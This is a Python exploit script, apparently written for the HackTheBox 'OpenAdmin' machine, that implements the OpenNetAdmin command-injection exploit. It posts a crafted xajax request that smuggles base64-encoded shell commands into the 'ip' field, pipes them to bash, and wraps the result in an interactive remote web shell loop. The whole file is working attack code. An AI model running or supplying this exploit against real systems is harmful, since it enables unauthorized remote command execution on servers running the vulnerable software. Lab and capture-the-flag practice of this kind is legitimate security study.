# Python implementation of the exploit: https://www.exploit-db.com/exploits/47691
# Made during the exploitation of the HackTheBox machine: OpenAdmin
# Author: c0rnf13ld

import re
import sys
import requests
import os
from base64 import b64encode

if len(sys.argv) != 2:
	print(f"Usage: python3 {sys.argv[0]} <url>")
	sys.exit(1)

# Global Variables
main_url = sys.argv[1]

if not main_url.endswith("/"):
	main_url = main_url+"/"
	print('"/" Was added to the end of the url:', main_url)

def makeRequest(cmd):

	# El data argumento también puede tener varios valores para cada clave. Esto se puede hacer haciendo una lista de
	# tuplas o un diccionario con listas como valores. Esto es particularmente útil cuando el formulario tiene varios elementos que usan la misma clave:
	post_data = {
		'xajax' : 'window_submit',
		'xajaxargs[]' : ['tooltips', f'ip=>;echo "BEGING";echo "{cmd}" | base64 -d | bash 2>&1; echo "END";', 'ping']
	}

	r = requests.post(main_url, data=post_data)
	try:
		regex = re.findall('BEGING\n(?:.*?\n)+(?:.*END\n)', r.text)[0] # (?: )Match Everything enclosed
		regex = regex.replace("BEGING\n", "")
		regex = regex.replace("END\n", "")
		print(regex)
	except IndexError:
		pass

def cmdToBase64(cmd):
	cmd = cmd.encode()
	cmd = b64encode(cmd).decode()
	return cmd

if __name__ == '__main__':
	r = requests.get(main_url)
	if r.status_code != 200:
		print(f"Status Code {r.status_code}, check the url.")
		sys.exit(1)

	print("Type exit to exit the web shell\nType clear to clear the screen\nEnjoy it :)")
	while True:
		cmd = input("$ ")
		if cmd == "exit":
			print("$ logout")
			sys.exit(0)

		if cmd == "clear":
			os.system("clear")
			continue
		cmd_ = cmdToBase64(cmd)
		makeRequest(cmd_)
